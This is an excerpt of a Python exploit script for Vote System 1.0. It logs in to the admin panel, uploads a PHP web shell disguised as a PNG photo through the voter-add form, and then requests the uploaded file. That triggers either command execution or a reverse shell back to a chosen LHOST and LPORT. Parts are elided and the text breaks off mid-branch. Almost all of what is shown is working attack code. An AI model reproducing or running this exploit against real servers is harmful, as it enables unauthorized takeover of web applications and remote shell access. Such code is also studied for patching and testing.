...
# Vote System 1.0 Authenticated file upload exploit - Automated reverse shell or remote code execution
# Author: Gurguii
...
def sendShell():
    global filename
    global images_url
    url = f"{images_url}/{filename}"
    print(f"Sending shell to {lhost} {lport}")
...
upload_file_url = f"http://{target}/admin/voters_add.php"
images_url = f"http://{target}/images"
rshell_payload = f"""
<?php
...
if args.rshell:
    payload = rshell_payload.replace("LHOST",lhost).replace("LPORT",lport)
else:
    payload = rce_payload
...
# Attempt to log in with given creds
login_response = session.post(login_url,cookies=session.get(f"http://{target}").cookies,data={"username":username,"password":password,"login":""})
...
# Now we attempt to upload our php file
upload_response = session.post(upload_file_url,data={"firstname":"a","lastname":"a","password":"a","add":""},files={"photo":(filename,payload,'image/png',{'Content-Disposition':'form-data'})})

if (upload_response.status_code == 200):
    print(f"[+] Successfully uploaded file => http://{target}/images/{filename}")
else:
